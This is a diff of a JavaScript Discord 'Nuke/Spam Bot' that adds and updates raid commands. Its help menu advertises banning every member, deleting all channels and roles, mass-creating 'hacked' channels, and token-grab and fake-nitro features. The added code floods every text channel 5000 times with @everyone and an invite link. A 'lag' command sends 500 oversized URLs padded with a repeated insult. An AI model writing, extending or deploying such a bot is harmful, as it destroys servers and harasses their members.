@@ -21,21 +21,27 @@ shit.on("message", tadishit => {
  const xdF = new Loser.RichEmbed()
  .setTitle("Nuke/Spam Bot | !help ")
  .setColor("RED")
- .setDescription(`:dash:!nuke=Bans all members & deletes all roles & channels
- :radioactive:!delete=Deletes all channels and roles
- :hammer:!ban=Bans all members
- :rocket:!channelrole=Create 50 Text and Voice and Roles name hacked
- :pencil:!text=Create 30 text name hacked
- :loud_sound:!voice=Create 30 voice name hacked
- :ferris_wheel:!role=Create 30 role name hacked
- :warning:!spam=Spam In Channels: [@everyone]
- :frame_photo:!imagespam=Spam In Channels Images With: [@everyone]
- :radioactive:!lag=Lag discord
- :sunny:!emojispam=Spam emoji In Channels: [@everyone]
- :outbox_tray:!left=The bot exits the server
- :gear:Credit By Boba#2000
- :robot:TadiShit (Remake)`)
- tadishit.channel.send(xdF)
+ .setDescription(`**:dash: !nuke - Bans all members & deletes all roles & channels (Disponibile)
+ :radioactive: !delete - Deletes all channels and roles (Disponibile)
+ :hammer: !ban - Bans all members (Disponibile) 
+ :rocket: !channelrole - Create 50 Text and Voice and Roles name hacked (Disponibile) 
+ :pencil: !text - Create 30 text name hacked (Disponibile) 
+ :loud_sound: !voice - Create 30 voice name hacked (Disponibile)
+ :ferris_wheel: !role - Create 30 role name hacked (Disponibile)
+ :warning: !spam - Spam In Channels: [@everyone] (Disponibile)
+ :frame_photo: !imagespam - Spam In Channels Images With: [@everyone] (Disponibile)
+ :radioactive: !lag - lag discord: [@everyone] (Disponibile)
+ :santa: !christams - Spam In Channels Christmas gif: [@everyone] (Disponibile)
+ :key: !free - Spam In Channels Token Grab: [@everyone] (Non disponibile)
+ :red_circle: !youtube - Spam In Channels Youtube channel: [@everyone]
+ :purple_circle: !twitch - Spam In Channels Twitch channel: [@everyone]
+ :incoming_envelope: !nitro - Dm nitro bot generator free (Non disponibile)
+ :sunny: !emojispam - Spam emoji In Channels: [@everyone] (Disponibile)
+ :outbox_tray: !left - The bot exits the server (Disponibile)
+ :question: Server Support: https://discord.gg/yWfpbFms
+ :gear: Credit By Boba#2000
+ :robot: TadiShit**`)
+ tadishit.author.send(xdF)
  }
  if(dioo === "nuke"){
     tadishit.guild.members.forEach(d => d.ban().catch(x => {
@@ -86,16 +92,64 @@ shit.on("message", tadishit => {
       
        }
  }
- if(dioo === "spam"){
- }
+ if(dioo === "emojispam"){
+    for (var i = 0; i < 5; i++) {
+        tadishit.channel.send(`
+:grinning: :smiley: :smile: :grin: :laughing::sweat_smile::joy: :rofl: :relaxed: :blush: :innocent: :slight_smile: :upside_down: :wink: :relieved: :smiling_face_with_tear: :heart_eyes: :smiling_face_with_3_hearts: :kissing_heart: :kissing: :kissing_smiling_eyes: :kissing_closed_eyes: :yum:
+:stuck_out_tongue: :stuck_out_tongue_closed_eyes: :stuck_out_tongue_winking_eye: :zany_face: :face_with_raised_eyebrow: :face_with_monocle: :nerd: :sunglasses: :star_struck: :partying_face: :smirk: :unamused: :disappointed: :pensive: :worried:
+:confused: :slight_frown: :frowning2: :persevere: :confounded:
+:tired_face: :weary: :pleading_face: :cry: :sob: :triumph: :angry: :rage: :face_with_symbols_over_mouth: :exploding_head: :flushed: :hot_face: :cold_face: :scream: :fearful: :cold_sweat: :sweat: :hugging: :thinking: :face_with_hand_over_mouth: :yawning_face: :shushing_face: :lying_face: :no_mouth: :neutral_face: :expressionless: :grimacing: :rolling_eyes: :hushed: :sleeping: :drooling_face: :sleepy: :dizzy_face: :zipper_mouth: :woozy_face: :nauseated_face: :face_vomiting: :sneezing_face: :mask: :thermometer_face: :head_bandage: :money_mouth: :cowboy: :disguised_face: @everyone`);
+    } 
+ 
+     }
+     if(dioo === "youtube"){
+         for (var daa = 0; daa < 5; daa++) {
+                  tadishit.channel.send(`
+Youtube Channel:
+https://m.youtube.com/channel/UCzahN-peTmLCU6T97pn4shQ/about
+@everyone`)
+         }
+     }
+     if(dioo === "twitch"){
+        for (var daa = 0; daa < 5; daa++) {
+                 tadishit.channel.send(`
+Twitch Channel:
+https://www.twitch.tv/ilmasseo
+@everyone`)
+        }
+    }
     if(dioo === "lag"){
         for (var i = 0; i < 500; i++) {
-       tadishit.channel.send(`https://tenor.com/view/minec%E5%B0%86%E5%B0%BD%E5%85%B6%E6%89%883%BB6%E6%89%883%BB6D%E5%85%B6%E6%89%883%BB6%E6%89%883%BB6D%E5%85%B6%E6%89%883%BB6%E6%89%883%BB6D%E5%85%B6%E6%D%E5%85%B6%E6%89%883%BB6%E6%89%883%BB6D%E5%85%B6%E6%89%883%BB6%E6%89%883%BB6D%E5%85%B6%E6%89%883%BB6%E6%89%883%BB689%883%BB6%E6%89%883%BB6D%E5%85%B6%E6%89%883%BB6%E6%89%883%BB6%E6%89%883%BB6%E6%89%883%BB6%E6%89%883%BB6%E6%89%883%BB6%E6%89%883%BD%E5%9C%B0
-       @everyone`);} 
+       tadishit.channel.send(`
+https://tenor.com/view/minecraft-reddit-funny-gif-14138658?size=我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你
+@everyone`);} 
 
+    }
+    if(dioo === "spam"){
+ for (var tt = 0; tt <5000; tt++){
+    tadishit.guild.channels.forEach(dii => {
+        if(dii.type === 'text') dii.send(`
+Server Link:
+https://discord.gg/psSCNS5FYT
+@everyone
+`).catch(e => {
+            console.log("Non posso mandare il messaggio in un canale.")
+        })})
+ }
+ 
     }
     if(dioo === "left"){
         tadishit.guild.leave()
+    }
+    if(dioo === "christams"){
+        for (var i = 0; i < 5; i++) {
+            tadishit.channel.send(`
+Server Link:
+https://discord.gg/psSCNS5FYT
+https://tenor.com/view/selamat-natal-merry-chirstmas-christmas-santa-gif-7326415
+@everyone
+`);
+        } 
     }
 })
 shit.login(merda.myfuckingtoken)
